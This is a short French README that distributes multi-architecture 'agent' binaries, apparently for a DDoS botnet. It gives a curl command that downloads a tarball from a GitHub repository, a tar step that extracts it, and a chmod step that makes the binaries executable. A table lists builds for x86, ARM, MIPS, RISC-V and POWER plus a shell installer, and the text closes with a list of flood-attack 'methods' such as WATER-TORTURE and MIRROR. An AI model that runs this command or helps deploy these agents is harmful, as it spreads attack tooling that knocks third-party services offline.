# OnlyNet Agents

Binaires multi-arch de l'agent OnlyNet — build **2026-11-25.12**.

```bash
curl -fL -o agents.tgz https://github.com/Malaki13/onlynet-agents/raw/main/agents.tar.gz
tar xzf agents.tgz
chmod 755 a-* i
```

| Fichier | Arch |
|---|---|
| `a-amd64` | x86_64 |
| `a-386` | i386 |
| `a-arm64` | aarch64 |
| `a-armv7` / `a-armv6` | ARM 32 |
| `a-mips*` | MIPS (BE/LE, 32/64) |
| `a-riscv64` | RISC-V |
| `a-ppc64le` | POWER8 |
| `i` | installeur POSIX `sh` |

Nouvelles méthodes : PHANTOM, HYDRA, RANGE-RIPPER, KNEE-SEEKER, CHAMELEON,
LOGIC-BOMB, GHOST-WIRE, WATER-TORTURE, FLAG-STORM, OUROBOROS, QUICKSHOT,
QUICKSILVER, QUANTUM-HELLO, MIRROR, MIDDLE-MIRROR, SIX-MIRROR.
